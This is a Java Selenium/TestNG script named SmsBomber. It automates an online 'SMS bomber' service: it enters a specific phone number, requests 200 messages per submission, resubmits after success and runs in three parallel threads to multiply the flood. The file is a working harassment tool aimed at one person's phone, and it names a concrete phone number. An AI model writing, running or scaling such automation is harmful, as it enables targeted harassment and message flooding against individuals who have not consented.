package DailyPratice;

import org.openqa.selenium.By;
import org.openqa.selenium.Proxy;
import org.openqa.selenium.WebElement;
import org.openqa.selenium.chrome.ChromeDriver;
import org.openqa.selenium.chrome.ChromeOptions;
import org.openqa.selenium.remote.RemoteWebDriver;
import org.openqa.selenium.support.ui.ExpectedConditions;
import org.openqa.selenium.support.ui.FluentWait;
import org.testng.annotations.Test;

import java.time.Duration;

public class SmsBomber {
    @Test(priority = 1,invocationCount = 3,threadPoolSize = 3)
    public void method1() {
        /*String proxyAddress = "127.0.0.1:8080"; // Replace with your proxy address and port
        Proxy proxy = new Proxy();
        proxy.setHttpProxy(proxyAddress);
        proxy.setSslProxy(proxyAddress);

        // Set up ChromeOptions with the proxy
        ChromeOptions options = new ChromeOptions();
        options.setProxy(proxy);*/

        RemoteWebDriver driver=new ChromeDriver();
        FluentWait<RemoteWebDriver>wait=new FluentWait<RemoteWebDriver>(driver);
        wait.pollingEvery(Duration.ofMillis(1000));
        wait.withTimeout(Duration.ofMillis(20000));
        driver.get("https://mytoolstown.com/smsbomber");
        driver.manage().window().maximize();
     WebElement e=driver.findElement(By.linkText("OPEN SMS BOMBER"));
     String script="arguments[0].scrollIntoView();";
        driver.executeScript(script,e);
        e.click();
        wait.until(ExpectedConditions.visibilityOfElementLocated(By.xpath("//input[@id='mobno']"))).sendKeys("7416472820");


        driver.findElement(By.xpath("(//input[@type='number'])[2]")).sendKeys("200");

       WebElement submit= driver.findElement(By.xpath("//button[@class='btn btn-success']"));

       String script1="arguments[0].scrollIntoView();";
       driver.executeScript("window.scrollBy(0,document.body.scrollHeight);");
       driver.executeScript(script1,submit);
       driver.executeScript("arguments[0].click();",submit);
        try {
           driver.findElement(By.xpath("//div[@class='alert alert-success']"));
           WebElement e1=driver.findElement(By.xpath("//h4[text()='SMS BOMB SUCCESSFUL']"));
           if(e1.isDisplayed()){
               driver.navigate().back();
               wait.until(ExpectedConditions.visibilityOfElementLocated(By.xpath("//input[@id='mobno']"))).sendKeys("7416472820");


               driver.findElement(By.xpath("(//input[@type='number'])[2]")).sendKeys("200");

               WebElement submit1= driver.findElement(By.xpath("//button[@class='btn btn-success']"));
               String script2="arguments[0].scrollIntoView();";
               driver.executeScript("window.scrollBy(0,document.body.scrollHeight);");
               driver.executeScript(script1,submit1);
               driver.executeScript("arguments[0].click();",submit1);
           }

        } finally {
            // Close the browser
            ///driver.quit();
        }

    }

}
